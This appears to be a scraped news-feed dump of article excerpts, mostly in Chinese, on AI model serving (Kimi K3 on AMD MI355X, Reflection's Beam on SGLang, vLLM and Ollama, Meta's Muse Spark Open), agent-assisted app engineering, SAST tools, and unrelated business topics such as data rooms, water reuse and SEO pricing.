在 AgentX 上，一套八 GPU 的 AMD Instinct MI355X 系统使用 vLLM 服务 Kimi K3，在 50 tokens/s/用户 P90 交互性下，每 GPU 每秒总 token 数比 NVIDIA HGX B300 高出 24.4% 。在该基准的拥有成本模型下，每美元 token 数 高出 87.4% 。
在本文中，我们将剖析 AMD Instinct MI355X 上 Kimi K3 背后的工程实现，将 vLLM 的服务决策与 GPU 内核及其底层硬件联系起来。我们将解释这些优化为何有效，并建立直觉，以便在你自己的推理栈中发现浪费的工作、识别瓶颈并找到下一个优化点。
交互性为 P90 响应 token 间延迟的倒数，不包括首 token 时间。总 token 包括复用的输入和生成的输出。
来源： SemiAnalysis InferenceX ，2026 年 10 月 9 日快照。 对比配置 。
已公布的稠密矩阵峰值为 AMD Instinct MI355X 的 10.1 PFLOP/s MXFP4 和 NVIDIA B300 的 13.5 PFLOP/s FP4。两者均配备 288 GB HBM3E 和 8 TB/s 峰值内存带宽。达到这一服务性能体现了 AMD 及其 vLLM 社区合作者持续不断的软件工程努力。
公开的 AgentX 基准使用合成 token 回放真实编码智能体会话轨迹，保留请求长度、时序和前缀共享模式。在缓存无限的情况下，该工作负载提供超过 96% 的理论前缀复用率。投机运行使用固定的合成接受参考。
在 50 tokens/s/用户 P90 交互性 下，AMD Instinct MI355X 服务约 7,567 总 tokens/s/GPU ，而 NVIDIA HGX B300 为 6,083 ， 吞吐量优势为 24.4% 。使用 SemiAnalysis 建模的 TCO，分别为 每 GPU 小时 1.50 美元对 2.26 美元 ，这转化为 每美元 TCO 1,816 万对 969 万总 token：每美元 token 数多 87.4% 。
SemiAnalysis InferenceX 公开曲线，并标注了 50 tokens/s/用户目标。 基准说明 。
公开曲线比较的是完整的服务栈。每项优化旁边的测量数据来自单独的测试，并在其所述配置下解释各自的机制。
Kimi K3 使用两种注意力。它的 24 个 MLA 层 保留随对话增长的压缩 KV 历史。新的查询仍会查阅该历史。它的 69 个 KDA 层 则携带固定维度的状态矩阵，并在新 token 到达时更新它们。 模型配置 。
在 MoE 层中，路由器选择专家网络来转换每个 token。它们的权重在各请求之间共享。
随着对话增长，MLA 保留更多历史。KDA 更新固定维度的状态；保留更早的检查点意味着保留该状态的额外副本。
跨轮次： 缓存复用与卸载（第 1 节）。 模型单步内： 专家投影、内核交接以及 MLA/KDA 调度（第 2–5 节）。 选择草稿深度： 已提交输出与完整周期成本（第 6 节）。
在 TP8 下，每个 GPU 处理 Kimi K3 的 96 个 MLA 查询头中的 12 个，但存储整个压缩 KV 历史。张量并行划分了头，却没有划分缓存。
使用 八路解码上下文并行（DCP8） 时，每个 GPU 存储八分之一的缓存位置。在解码期间，各 GPU 交换查询，针对其本地历史进行计算，并合并它们的部分答案。
两块 GPU 展示了 TP8/DCP8 所使用的相同划分。这种额外划分适用于 MLA 历史；KDA 状态保持其现有的按头划分。
每个部分答案都携带归一化信息，以便合并时能正确地对各分片加权。 #51705 将 ROCm AITER DCP 路径扩展到多 token 验证。
对于一段 142,000 token 的对话，估计的 MLA 负载为 24 层 × 142,000 个位置 × 576 FP8 字节 ≈ 每 GPU 1.96 GB。DCP8 将其减少到约 245 MB，尚未计入分配开销。每个 GPU 针对八分之一的历史处理八倍数量的头，使主导的注意力算术大致保持不变。
当状态不再能放入 GPU 内存时， AMD recipe 的原生 vLLM CPU 卸载会将 MLA 历史和 KDA 检查点保存在主机 DRAM 中。
缓存命中需要匹配的恢复点。如果 MLA 历史到达 token 3,072，但最新的兼容 KDA 检查点在 2,048，则请求必须从 2,048 恢复并重新计算剩余前缀。
将 attention-block 尾部与 KDA checkpoint 一起保存，可使它们的恢复位置对齐（ #54736 ）。恢复该状态需要将数据传回 GPU，但可避免前缀重计算。一旦请求恢复，其新 token 仍可能让多个 GPU 重复相同的计算。

items.title: SGLang 原生支持 Reflection 的 Beam 并驱动其生产 API
items.description: SGLang 团队宣布原生支持 Reflection 的 Beam 1.0（501B 参数 MoE、每 token 激活 23B），并以其驱动 Reflection 的生产 API。 🔗 阅读原文 via AIHOT · https://aihot.news/items/i6u3av7zg8n3gfy6g7ynhns56
items.excerpt:
Blog SGLang Powers Beam in Production Reflection’s Beam is a 501B-parameter mixture-of-experts model with 23B active parameters per token, built for software engineering and long-horizon agentic tasks. With its planned Apache 2.0 release,... SGLang Team October 16, 2026
SGLang 团队宣布原生支持 Reflection 的 Beam 1.0（501B 参数 MoE、每 token 激活 23B），并以其驱动 Reflection 的生产 API。
原文给出 SGLang 对 Beam 的原生支持细节与实测吞吐数据，读者可据此评估该推理栈在智能体负载下的服务性能。
Reflection 的 Beam 是一个 501B 参数的混合专家模型，每个 token 激活 23B 参数，专为软件工程和长周期智能体任务打造。Beam 计划以 Apache 2.0 许可发布，旨在让开发者能够在他们已经在使用的运行时、框架和编码工具链上部署和构建。
SGLang 现已原生支持 Beam，并为 Reflection 的生产 API 提供支持。它帮助开发者将 Beam 的推理效率转化为经过生产验证的实用服务性能。BF16、NVFP4 和动态 FP8 支持在精度和内存需求方面提供了灵活性；DFlash2 投机解码加速生成；前缀缓存与混合注意力内存管理相结合，实现了智能体交互间上下文的高效复用。在这些服务能力之下，我们优化了 Beam 的投影、归一化和通信，以提升吞吐量。
本文介绍 Beam 在 SGLang 上的集成、优化和性能结果。要部署该模型，请从我们的 Beam 服务指南 开始，获取经过验证的配置和启动说明。
Beam 将分组查询注意力与滑动窗口和全注意力层的混合结构相结合。其前馈堆栈从密集 SwiGLU 层开始，然后切换到路由 MoE。Beam 在投影前对注意力输出进行门控，并在两个分支周围放置三明治归一化。深度缩放残差控制每个分支如何加入隐藏状态流。
Beam 的解码器以及单层内的操作。注意力和前馈分支都以输出归一化和深度缩放残差加法结束。
检查点指定了注意力和前馈调度。原生注意力调度在滑动窗口层组之后放置全注意力，并以全注意力结束。这为服务栈提供了两种需要管理的 KV 生命周期：全注意力的完整历史，以及滑动注意力的近期窗口。
GQA 在 48 个查询头之间共享八个 KV 头，从而减少 SGLang 为每个 token 存储的 KV 缓存。滑动窗口层也将其活跃历史限制在最近的窗口内，并使用 RoPE。全注意力层使用 NoPE，并采用位置相关的 SSMax 查询缩放。两者都在注意力之前对 Q 和 K 进行归一化。
Beam 在输出投影之前对注意力结果进行门控。第二个投影从归一化后的隐藏状态生成门激活；模型添加一个学习到的逐头偏置，应用 sigmoid，并将注意力输出与逐元素门相乘。QKV 和门投影共享一个输入，这让我们可以在符合条件的布局中将它们打包成一个 BF16 投影。
前三个前馈层使用稠密 SwiGLU。后续层从 256 个专家中选出八个专家，并组合它们的 SwiGLU 输出。
路由器计算 FP32 logits。分组 top-k 选择使用 sigmoid 分数和专家校正偏置来选择专家。后端保留 FP32 路由系数，并在专家组合期间应用 Beam 的路由缩放因子，或者在该内核需要时将其携带在路由权重中。
Beam 的全注意力层使用可扩展 Softmax（SSMax），以在上下文增长时保持注意力聚焦。在 Q/K 归一化之后，位于从零开始的位置 p 的每个查询按 (1+(p+1)/2048)0.1 缩放。这会逐渐锐化注意力分布，抵消 softmax 权重在长上下文中倾向于分散到更多 token 的趋势。
每个注意力和前馈分支都有输入和输出 RMS 归一化。Beam 按从层深度推导出的系数缩放分支和残差，然后将它们相加。两个缩放后的操作数在相加之前都会舍入到激活数据类型。
未融合的过渡会写入归一化后的分支，读取它进行残差组合，并读取组合结果用于下一个输入归一化。这些内存传递在解码器中重复进行，因此我们在保持 Beam 舍入边界的同时融合该过渡。最终解码器归一化和语言模型头馈入 FP32 logit softcapping。
Beam 通过 SGLang 的 DFLASH 运行时 支持 DFlash2。目标模型在最终归一化之前捕获所选解码器层的层后残差。草稿模型使用这些特征来提议一个 token 块，Beam 在一次目标前向中验证该块。
Beam 的集成添加了一条新的 CUDA 服务路径，将 DFlash2 与注意力数据并行相结合。借助 --attn-dp-size N 和 --enable-dp-lm-head ，运行时使注意力和草稿头工作与 DP 布局保持一致。SGLang 在 DP 填充确定最终 token 形状之后初始化目标验证元数据，包括存在空闲对等方的批次。
我们将草稿 KV 内存纳入混合池预算，以便目标缓存分配为草稿模型留出空间。草稿捕获要求 PP=1，并且服务上下文必须同时容纳目标模型和所选的草稿模型。
Beam 的全注意力 KV 随上下文增长，而其滑动层保留一个近期窗口。上游 SGLang 的统一 KV 分配器用共享的 GPU 页预算为这些分配提供支持。请求表保持稳定的虚拟 token ID；注意力读取和 KV 写入将它们转换为当前物理槽位。 转换接口 在两个方向上使用相同的虚拟到物理契约。

items.excerpt:
Reflection's Beam is freely available on Ollama for a limited time
Reflection 首个开源权重模型 Beam 发布，Ollama 作为 day-zero 合作方在 Ollama Cloud 上限时免费提供，且全程零数据保留（ZDR）。
Ollama 作为首发合作方介绍 Beam 的参数结构、上下文窗口和 ZDR 云端接入方式，读者可以据此评估在本机或云端运行该模型的可行性。
Reflection 的首个开放权重模型 Beam 于今天上午正式发布，我们是零日合作伙伴，在 Ollama 上免费推出（仅限时！）。与 Reflection 合作，Ollama 的 Beam 端点运行时完全零数据保留（ZDR）。你可以通过 Ollama Cloud 访问 Beam，在那里你可以从应用或终端运行支持的模型，无需下载模型或管理本地推理。

Serving Reflection Beam on vLLM from Day 0
vLLM 宣布从 Day 0 支持 Reflection 的 Beam 模型，这是一个 501B 参数、每 token 激活 23B 的 MoE 模型，在 NVIDIA Blackwell 上完成优化。

TL;DR： Reflection 的 Beam 是一个 501B 参数的 MoE，每个 token 激活 23B 参数。vLLM 从第 0 天起就支持它，并在 NVIDIA Blackwell 上对其进行了优化：
要试用它，请使用我们的 Docker 镜像 vllm/vllm-openai:reflection-beam ：
Beam 是一个 52 层的 MoE 解码器，隐藏维度为 5120。MoE 路由遵循 DeepSeek-V3。主要区别在于注意力层以及残差流的归一化方式。
图 1：Beam 的层堆叠和一个稀疏解码器层。金色标记的是与标准 pre-norm MoE 不同的部分。 全屏打开 。
我们最初的实现版本是一个未优化、几乎纯 PyTorch 的模型版本。随后我们用编码智能体自主优化它：它们对模型进行性能分析、编写 kernel，并对每项改动进行基准测试。在 TP8 上，以下七项改动将 batch-1 解码从每步 8.95 ms 降至 3.30 ms，并将 8 × 2K 预填充从 328 ms 降至 176 ms。
图 2：每次更改后 GB200 上的 TP8 模型前向延迟，针对 batch-1 解码和约 100K 上下文下的 8 × 2,048 token 预填充。两个面板使用不同的刻度。查看表格以获取精确值，或 全屏打开 。
在这些更改之后，一个 MoE 层在 TP8 上的 batch-1 解码中作为 13 个 kernel 运行。
图 3：一个 MoE 层的 kernel 启动顺序，来自 batch-1 TP8 解码的 rank-0 trace。金色 kernel 是为 Beam 编写、融合或扩展的。每个 kernel 列出它计算的操作。 全屏打开 。
图 4：FlashInfer CuteDSL NVFP4 MegaMoE 可以将通信与专家计算融合。
在高并发区域，Beam 的性能可以通过将 Attention DP 与 MegaMoE 结合来进一步提升，由 FlashInfer 的 CuTe DSL NVFP4 MegaMoE kernel 提供支持。Finalize + norm 边界融合仍然适用。
Attention DP 与 MegaMoE 结合实现了比 TP4 高 1.71 倍的峰值预填充吞吐量。基准设置：4×GB300，输入序列长度为 32K token，输出序列长度为 1 token，以隔离预填充性能。
要启用 Attention DP + MegaMoE，请将 MoE 和并行设置替换为：
Beam 附带一个 DFlash2 草稿头，vLLM 从第 0 天起就支持。它不是一次草拟一个 token，而是从目标模型的隐藏状态中在单次前向传递中预测整个 token 块。
在 TP8 上的服务结果，包含和不包含自适应验证，在 SPEED-Bench 的 throughput_1k 分割的低熵类别上：约 1K token 的提示，主要是代码补全和文本排序，使用贪心解码，最多 4K 输出 token。低熵文本更容易预测，因此在开放式聊天中预期接受率会更低。
自适应验证在负载下带来收益。在并发数 128 时，它将输出吞吐量提高 10.8%，并将 p99 TPOT 降低 9%，同时每步验证更少的 draft token，这略微降低了接受长度，但节省的计算量超过损失。在低并发下，额外 draft token 几乎免费，因此它是中性的。
本文顶部的命令是一个不错的默认值：在单个 GB300 节点上使用 TP4，搭配 DFlash2 和 FP8 KV cache。要启用自适应验证，请将 "enable_adaptive_verification": true 添加到 --speculative-config 。上述其他优化默认开启。
我们还与 SkyRL 团队合作，为 Beam 上的 RL 提供 Day 0 支持。开箱即支持 LoRA、BF16 全量微调和 MXFP8 RL，并为 500B 规模升级了 RL 栈。
SkyRL 团队使用 DAPO 配方对 Beam 模型进行了后训练，推理使用 vLLM，训练使用 Megatron。LoRA、全量微调和 MXFP8 RL 在 50 个训练步骤（即 100 次优化器更新，推理 minimal ）中取得了相似的性能提升，在 AIME25 上的平均准确率（avg@8）从约 61% 跃升至约 79%。在 LoRA 和 BF16 全量微调启用 Rollout Routing Replay (R3) 的情况下，Megatron 与 vLLM 之间的平均绝对 log 概率差保持在 0.01 以下，MXFP8 RL 则保持在 0.03 以下。

items.excerpt:
The movement of a robot arm occurs after a signal is sent out by the controller. But there is another world beyond the controller.
There are Python services that queue up tasks. There are Java backends responding to API requests. Modules are passing around data.
Bugs live there too. A weak validator within an API handler. A common login component that takes faulty input. It all stays away from hardware. It all has the potential to halt the assembly line if a mistake gets by.
SAST reads code the way a proofreader reads a draft. Nothing runs yet. The flaws show up on the page.
What follows covers five tools built for Python and Java backends. Where each one digs. How deep it goes across files. Where it fits in a normal working day.
One boundary before we start. Firmware security sits elsewhere. So does functional-safety certification. Neither belongs in this comparison.
Choose the wrong scanner and the team will spend months babysitting it. But what is really important here?
Language first. If the backend runs Python and Java, the tool has to handle both. Not every scanner does. Some treat one as an afterthought.
Then the part most people miss. A vulnerability rarely sits in one file.
Picture the path. A request hits an API handler. It moves through a validation function. It lands in a database query written in a completely different module.
A scanner that reads each file alone sees three innocent pieces. Nothing connects them. Cross-file analysis connects them.
Integration decides whether findings ever get fixed. A warning buried in a separate security dashboard tends to sit there. A warning posted as a comment on the pull request gets answered.
And the usual suspects deserve attention. Injection flaws. Broken authentication. Insecure deserialization. Hardcoded secrets left in a config file. These show up in automation backends as often as anywhere else.
The tools below differ in analysis depth, language support, and how they fit into development workflows. Each has a place, depending on team size and existing processes.

items.excerpt:
Renewables made up 85.6% of all new power capacity added worldwide in 2025, according to the International Renewable Energy Agency’s Renewable Capacity Statistics 2026.
Each new solar park, wind farm, and battery site adds another stream of operational data. Energy companies turn those streams into value through data platforms built for different jobs.
The hard part starts before the first vendor call. Without a clear list of sources, owners, and constraints, vendors fill the gaps with assumptions, and proposals for one project arrive with different scopes and prices.
This article reviews the best firms providing energy data platform development services and the work each one has delivered. You will also find what to prepare before you brief a vendor, from a data source inventory to security limits, and how to test your chosen vendor through a pilot before a full build.
A vendor can only price and plan what you describe. Here are the 6 inputs that give every shortlisted firm the same starting point and make their proposals comparable:
List every system that produces data the platform will use: SCADA historians, meter head-ends, IoT gateways, asset registers, weather services, and market feeds.
For each source, note the format, how often it updates, the time zone it logs in, and roughly how much data it produces a day.
Vendors size ingestion and storage from this list, so a missing source shows up later as a change request. A spreadsheet with one row per source is enough to start your brief.
Every source needs a named owner who can approve access and answer questions about the data. Write down who that person is, which team they sit in, and how a vendor would get read access, whether through an API, a database replica, or file exports.
Access requests for control systems can take weeks, so starting them before the brief keeps your project schedule intact.
A week of real data from each main source shows a vendor what written descriptions miss. Anonymize customer details if needed, but keep the original timestamps, units, and gaps. Vendors use these samples to spot quality problems early and to estimate the cleaning work in your proposal.
State where the data may live: a specific cloud, your own data center, or a hybrid setup. Add the standards your security team applies, such as ISO 27001 or NERC CIP, and any rule that keeps control-system networks closed to inbound traffic.

Forum 是一款独立的小组应用，由一个小团队从零开始构建。它也是我们测试一种不同工作方式的场所：将 AI 智能体视为工程流程的参与者，而不是更快的打字方式。
这项实验需要定义成功，而我们的标准不是代码量。我们衡量的是经过验证、可投入生产的结果——能够构建、通过测试并经受审查的变更。
仅将 AI 指向编码步骤本身并不会带来太大改变。当我们将这一方法扩展到实现前后的各个阶段——规划、构建、测试和验证——我们的成果开始复利式增长。看清这一转变最直观的方式，是看每个步骤由谁主导。
在 human-in-the-loop 模式下，工程师驱动每一步，AI 在其中辅助，自动补全函数、建议修复方案或回答问题。 每次迭代都以驱动者本人的节奏推进。
在 human-on-the-loop 模式下，智能体自行运行迭代——规划、实现、构建、测试、修正、重复——而工程师设定目标、观察运行、在偏离时介入并批准结果。人的工作从执行步骤转变为对结果负责并守住质量标准。这是我们努力的方向，而非已完成的终态：如今有些阶段已能自主运行，而另一些阶段仍需工程师参与每次迭代。
当工程师进行监督时，工作不再是严格的顺序执行。过去一次只能运行一个的循环可以重叠，工程师的时间用于方向和判断，而不是坐在循环里等待。但这一切只有在返回的结果可信时才成立。没有验证，AI 生成的代码会带来一个熟悉的问题——看似合理但无人确认其真正可用的输出，工程师随后不得不阅读、调试，并常常将其丢弃。弱信号并不能消除这一约束；它们只是把约束从编写代码转移到审查那些看起来已完成、实则不然的代码上。
因此我们把标准设在验证而非编译上。编译不是终点——只有自动化测试和视觉检查都通过，任务才算完成。智能体在工程师看到之前先检查自己的工作，这意味着到达审查环节的是一组数量更少、可信度更高的结果，而不是一堆需要筛选的输出。生成得更少，丢弃的也更少。每个交付的结果仍需工程师签字确认；我们的努力在于让这一签字确认快速且有据可依，将构建结果、测试结果和录制的验证会话附加到变更上。
将规划作为技术规范： 智能体执行需要极高的精确度。工程师可能凭直觉解决的歧义会导致智能体失败。我们投入于严格的上游分解和机器可读的上下文，这为工程师和智能体同样收紧了工程闭环。
循环内的自动化验证是力量倍增器： 我们将自动化的通过/失败信号——构建状态、单元测试和 UI 规范匹配——直接集成到智能体循环中。这使得异步开发能够产出可供审查的拉取请求，并预先填充测试计划和录制的验证会话。验证是最难做对的部分，而我们能安全地交给循环多少，取决于我们能多大程度信任验证器。
使用智能体进行模拟用户测试： 我们部署了导航智能体，它们像真人一样与实时应用交互。这些智能体执行操作、读取屏幕并报告回归问题。导航智能体能够持续运行相同的验证路径。
智能体化生产运维： 发布后，智能体帮助自动化根因分析。当使用 Forum 的人提交反馈时，智能体会利用该反馈调查可能的回归问题。随后智能体将分析转发给工程师，由工程师决定下一步行动。
架构清晰性优先于继承的复杂性： 我们努力保持 Forum 的代码库尽可能简单直接，并选择将架构的关键部分模块化，以便在获得久经考验的基础设施优势的同时，也让智能体能够轻松即插即用。在无法轻易做到的地方，我们从头重建，以复用性换取智能体吞吐量，事实证明这在开发速度上很有回报。智能体从它们阅读的代码中学习模式。修复一次薄弱的模式，未来每个智能体会话都会继承这一改进；放任不管，同样的捷径就会出现在智能体接下来编写的所有内容中。
给智能体工具，而不是描述： 我们的主要失败模式是智能体搞不清自己在应用中的位置——让它修改群组主页时却去编辑首页信息流，或者靠猜屏幕坐标。所以，我们没有向智能体描述应用，而是给它工具去核查：从模拟器读取实时视图层级、列出屏幕上实际存在的元素、查找通往目标视图的路径——全部在它行动之前完成。误操作的编辑大幅减少。我们在智能体接触系统的所有地方都采用了同样的方法：给智能体一种直接核查状态的方式，而不是让它基于描述去推理。
为安全的 AI 原型开发提供构建级隔离： 随着 Forum 逐步走向生产环境，我们希望早期原型和智能体生成的实验有运行空间，同时让生产应用严格只包含已完成、经过审查的工作。我们想要比单纯的功能开关更强的保证——功能开关下原型代码仍然存在于生产构建中。我们的解决方案是一个 独立的构建变体 ，一个沙盒应用，它与生产环境共享完全相同的代码库、框架和设计系统，但通过插件/套接字架构将原型代码完全 排除 在生产构建之外。
改造环境不仅让智能体构建起来更快——它还让智能体成了测试员。我们没有把它指向某个具体缺陷。相反，我们设置了可重复的压力场景来模拟真实用户行为（激进滚动、随机浏览群组、快速导航、反复加载媒体），并在各构建中例行运行。由于这些运行会产生一致的信号（崩溃、内存增长、页面错误、UI 回归），智能体可以分诊异常、缩小到触发序列，然后调查根本原因。
其中一次运行暴露了一个内存问题。智能体隔离出复现步骤、提出修复方案并验证了它——全部在开发期间完成，早于应用到达用户手中。该修复在反复的压力会话中显著减少了设备上的内存增长和页面错误。
虽然架构决策由工程师做出，但检测和回归监控是自动化且可重复的；一旦检测到异常，智能体就能用同一套测试框架完成复现

items.excerpt:
Virtual data rooms are designed for business processes where confidential documents must be shared with multiple internal and external parties under controlled access.
M&A due diligence is the best-known example, but VDRs are also used for fundraising, audits, restructuring, real estate transactions, and other document-heavy projects.
This review looks at the Ideals virtual data room from a practical buyer’s perspective: what the platform offers, how its pricing is structured, and which workflows it is designed to support.
The aim is not to label one platform universally superior, but to identify the factors organizations should verify against their own requirements.
The Ideals data room combines document management, access control, reporting, Q&A, and security settings in a single project environment.
Administrators can organize participants into groups and assign permissions according to the information each group should be able to access.
According to the current Ideals Help Center, the platform provides eight document permission levels. Permissions are assigned at the group level, can be applied to folders and supported files, and can be changed during the project.
This structure is useful when bidders, advisers, specialists, and internal teams require different views of the same data room.
Document organization is central to a VDR because security alone does not make a review efficient. Ideals supports folder-based organization, document access controls, search, reporting, and other tools intended to help participants work through large document sets.
Administrators can also use project security settings such as two-step verification and restrictions based on IP addresses or domains. These controls are especially relevant when a project includes external users working from different organizations or locations.
The access model is consistent with the NIST principle of least privilege , which recommends restricting users to the minimum access necessary to perform assigned tasks. Buyers should still test the actual permission configuration they plan to use rather than relying only on a feature list.
For due diligence, document access is only part of the workflow. Reviewers also need a controlled way to ask questions, while administrators need visibility into project activity.

items.description: Water is the utility most automation projects overlook. A plant that has instrumented every conveyor, robot cell and packaging line still sends its rinse water, cooling tower blowdown and process effluent to drain, then buys fresh water to replace it. Industrial water reuse changes that. Treated effluent comes back as cooling tower makeup, washdown water […]
items.excerpt:
Water is the utility most automation projects overlook. A plant that has instrumented every conveyor, robot cell and packaging line still sends its rinse water, cooling tower blowdown and process effluent to drain, then buys fresh water to replace it.
Industrial water reuse changes that. Treated effluent comes back as cooling tower makeup, washdown water or process feed, and the same control architecture that runs the production line keeps the water loop within specification.
Reuse projects fail when a system is sized from a brochure instead of from the plant’s own water. Rinse water from a metal finishing line, effluent from a food plant and cooling tower blowdown each carry a different load of dissolved solids, oils, metals and organics, and each needs a different treatment train.
ProChem, an industrial water treatment company that designs, builds and operates reuse systems, works through a four-step method it calls the ProChem process : diagnose the water with sampling and treatability testing, engineer the treatment program and prove it on a mobile pilot system running on the live effluent, deploy the full-scale system with chemistry and equipment from one source, then optimize it as production and water conditions change.
The pilot stage is the part automation engineers will recognize. Running a skid on real wastewater for days or weeks produces the performance data that sets the control setpoints for the full system, in the same way a line trial precedes a production changeover.
A reuse loop is a continuous process, and it is instrumented like one.
Conductivity probes track total dissolved solids, the main signal for how much of the recovered water can be returned before minerals concentrate past the limits of the cooling tower or the process. Turbidity meters flag suspended solids that would foul membranes.
pH and oxidation-reduction potential (ORP) sensors govern chemical dosing, from neutralization to the biocide that keeps biological growth out of the recovered water.
The programmable logic controller (PLC) ties the readings together: it modulates chemical feed pumps, opens and closes the blowdown valve on the tower, diverts off-spec water back to the head of the treatment train, and logs every value to the plant historian.

items.excerpt:
Running a growing marketing firm means figuring out when to scale your internal team and when to pass the heavy lifting to outside experts.
For many businesses, the most realistic path to expanding their search visibility services without taking on new payroll is partnering with a reliable white label seo agency .
By essentially renting a team of specialists who work quietly behind the scenes under your brand, you can offer more to your clients while keeping overhead costs incredibly manageable.
Choosing the right partner takes more than just reviewing their case studies – you need to know how they bill. Here is a look at the most common pricing structures so you can find one that protects your margins.
Perhaps the most common approach you will encounter is the fixed monthly retainer, a model that provides a lot of stability for both you and your outsourcing partner.
In this setup, you pay a flat fee every month for a specific, agreed-upon set of deliverables – think a set number of blog posts, technical audits, or monthly backlink placements.
This predictability is extremely helpful when managing cash flow, as maintaining steady and forecastable expenses is a baseline requirement for any agency trying to scale up without overextending its bank account.
Because your wholesale costs are locked in place, you can confidently mark up these services and quote your own clients a consistent rate, virtually guaranteeing your profit margin month over month.
The main catch here is that you are locked into this fee even if a client needs less work during a slow season, so you have to monitor account usage closely to make sure you get the value you are paying for.
Pay-per-performance pricing is another option that shifts almost all the financial risk away from your agency and directly onto the vendor.
Under this model, you only hand over cash when the vendor actually hits specific, predefined milestones, such as securing a first-page ranking for a competitive keyword or driving a certain volume of organic traffic.
This creates a highly attractive pitch to bring to your own clients, letting you promise them real-world results with very little upfront financial risk on your end.

今天，Meta 发布了 Muse Spark Open 的权重，这是迄今为止能力最强的美国开放权重模型。它今天已在 Hugging Face 上以 Muse Model License 提供。Muse Spark Open 在 SGLang 和 vLLM 推理引擎上进行了优化运行，并针对 NVIDIA、AMD 和 Intel 进行了优化。
基于我们 8 月发布的 Muse Spark，这个开放权重版本增加了额外的安全后训练，使其在没有系统护栏的情况下作为独立模型使用时更能抵御滥用。其结果是该模型成为安全方面的顶级开源选择。Muse Spark Open 是一个 816B 总参数/42B 激活参数的模型，上下文窗口为 1M tokens。Muse Spark Open 专为编码和智能体工作而构建，原生多模态，并与 Muse Spark 1.3 共享相同的基础模型。
Meta 热爱开源，作为 PyTorch 的创造者，我们致力于回馈社区，以确保整个生态系统完全支持 Muse Spark Open。首先，我们集成了 Helion ，这是我们激动人心的全新 PyTorch 原生高级 DSL，用于高性能且可移植的 ML 内核，以提供高性能运算。此外， TorchTitan 已经开箱即用地支持 Muse Spark，用于公开的监督微调和 RL，我们很期待看到 PyTorch 社区能把它推进到多远！
Muse Spark Open 是一个针对编码优化的开放权重模型。它专门针对智能体编码工作流进行训练，提供更高的首次尝试准确率、可靠的工具调用，以及对开发者实际使用的代码仓库的深度代码库理解。你可以在我们之前的模型发布博客中阅读更多内容 此处 。
擅长代码生成、调试和代码库理解。基于真实开发者工作流训练——多文件重构、调试会话和长时间运行任务——因此模型能跟上你实际的工作方式。1M 上下文窗口意味着它可以处理你的整个项目，包括复杂依赖、遗留代码和数千个文件，而无需将任务拆分成多个部分
Muse Spark Open 具备音频和音视频感知能力——以及图像和文档理解。作为一个推理模型，它原生且可靠地处理图像、音频和文本输入。
Muse Spark Open 从一开始就作为智能体模型构建。它规划步骤、行动、观察，并在长时间跨度内自我纠正——而不仅仅是单次工具调用。它经过训练可以浏览网页（包括多模态浏览），并使用智能体框架来：为可分解的工作生成并协调子智能体；以及利用统一于桌面、移动端和浏览器的计算机使用能力。 它基于长时间跨度、多站点任务进行训练，并生成单独的评论，让模型在行动前说明意图——因此你始终可以知道它在做什么以及为什么。
Helion 是一种 PyTorch 原生的内核编写语言，专为跨异构硬件平台编写高性能内核而设计。在开源生态系统的早期采用之后，Helion 于 2026 年 4 月成为 PyTorch Foundation 的一部分。Muse Spark Open 随附了 RoPE、RMSNorm、量化等操作的 Helion 实现，在 NVIDIA GB300 上，相比用硬件特定语言（例如 NVIDIA CUDA 和 CuTe DSL）编写的自定义内核，实现了 1.03 – 3.95 倍的加速。这些相同的内核可直接移植到 AMD，在 AMD Mi350 上取得了类似的性能提升，端到端吞吐量整体提升了 3%。
此外，我们还在 SGLang 中为 Muse Spark Open 推出了 Helion megakernels。这些内核完全用 Helion 编写，将多个操作融合到单个持久内核中，以改善低延迟推理，并且同样可以针对不同的形状和硬件进行自动调优。
用户可进一步针对更广泛的硬件平台和工作负载对 Helion 内核进行自动调优——包括不同的加速器架构（NVIDIA、AMD、Google TPU 等）、量化格式、张量形状和并行策略——而无需为每种配置维护单独的手工调优实现。这些能力共同使实现可移植性能变得更加容易，同时降低了开发和维护专用内核的成本。
TorchTitan 是一个 PyTorch 原生平台，专为生成式 AI 模型的快速实验和大规模训练而设计。从今天起，TorchTitan 新增了 Meta 的 Muse Spark Open 的模型定义，因此开发者可以根据自己的需求对其进行调优。
TorchTitan 开箱即用地原生支持多轮 SFT 和 LoRA，以及强化学习能力（TitanRL），允许用户对 Muse Spark Open 进行微调。
我们分享这项工作，是因为我们希望每个人都能使用最好的 AI 模型。Muse Spark Open 随附了 SGLang 中自定义、可自动调优的 Helion GPU 内核，在 NVIDIA 和 AMD GPU 上实现了 1.03–3.95 倍的内核级加速，在 AMD MI350 上实现了 3% 的端到端加速。你还可以利用 PyTorch 的 TorchTitan 进一步调优模型，以满足你的用例需求。
